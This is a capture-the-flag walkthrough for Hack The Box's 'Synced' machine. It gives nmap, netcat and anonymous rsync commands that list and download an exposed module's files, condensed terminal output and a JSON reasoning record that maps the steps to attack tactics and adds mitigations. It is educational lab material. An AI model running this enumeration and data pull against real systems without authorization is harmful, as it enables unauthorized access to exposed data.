# HTB Synced - Rsync Enumeration Playbook

Target theme:
- Protocol reconnaissance
- Anonymous rsync module exposure
- Data retrieval via sync operation

Use only in authorized labs.

---

## 1. Objective

1. identify rsync service exposure,
2. enumerate available modules,
3. pull accessible data safely,
4. evaluate data exposure impact.

---

## 2. Service Discovery

```bash
nmap -sC -sV -Pn <TARGET_IP> -oN nmap_scan
```

Expected key finding:
- 873/tcp open (rsync)

Optional quick banner check:

```bash
nc -nv <TARGET_IP> 873
```

---

## 3. Enumerate Rsync Modules

List exported modules anonymously:

```bash
rsync -av rsync://anonymous@<TARGET_IP>/
```

If module `public` appears, sync it locally:

```bash
mkdir -p rsync_shared
rsync -av rsync://anonymous@<TARGET_IP>/public ./rsync_shared
```

Inspect pulled content:

```bash
find ./rsync_shared -maxdepth 3 -type f
cat ./rsync_shared/public/flag.txt
```

---

## 4. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn 10.129.228.37
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

analyst@kali:~$ rsync -av rsync://anonymous@10.129.228.37/
receiving incremental file list

public

sent 43 bytes  received 93 bytes  272.00 bytes/sec
total size is 0  speedup is 0.00

analyst@kali:~$ rsync -av rsync://anonymous@10.129.228.37/public ./rsync_shared
receiving incremental file list
public/
public/flag.txt

sent 66 bytes  received 248 bytes  628.00 bytes/sec
total size is 33  speedup is 0.11

analyst@kali:~$ cat ./rsync_shared/public/flag.txt
HTB{...flag...}
```

---

## 5. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "synced_anonymous_rsync_module",
	"input_signals": [
		"Rsync service exposed on 873/tcp",
		"Anonymous module listing succeeded",
		"Public module synchronized without credentials",
		"Sensitive file retrieved from exported directory"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service Discovery",
			"confidence": 0.97,
			"evidence": "nmap detected rsync on 873"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Anonymous/Guest Access",
			"confidence": 0.94,
			"evidence": "rsync module listing worked with anonymous user"
		},
		{
			"step": 3,
			"tactic": "collection",
			"technique": "Data from Information Repositories",
			"confidence": 0.92,
			"evidence": "public module download exposed flag file"
		}
	],
	"hypotheses": [
		"Other rsync modules may expose backup/config/credential artifacts",
		"Same anonymous policy may apply on additional hosts",
		"Rsync export path may include operational data useful for lateral movement"
	],
	"uncertainties": [
		"Write access to module not validated",
		"Scope of exposed directories beyond public not fully tested",
		"No evidence yet of protocol-level access controls"
	],
	"tool_calls": [
		{"name": "rsync_module_mapper", "priority": "high"},
		{"name": "backup_artifact_hunter", "priority": "high"},
		{"name": "credential_pattern_scanner", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable anonymous rsync access",
			"Restrict exported modules to authenticated users",
			"Remove sensitive artifacts from publicly synced paths"
		],
		"hardening": [
			"Bind rsync to internal interfaces only",
			"Enforce allowlist-based host ACLs",
			"Review and minimize rsync module exposure"
		],
		"monitoring": [
			"Alert on anonymous module listings",
			"Track unusual full-directory sync operations",
			"Monitor repeated rsync access from unknown source IPs"
		]
	}
}
```
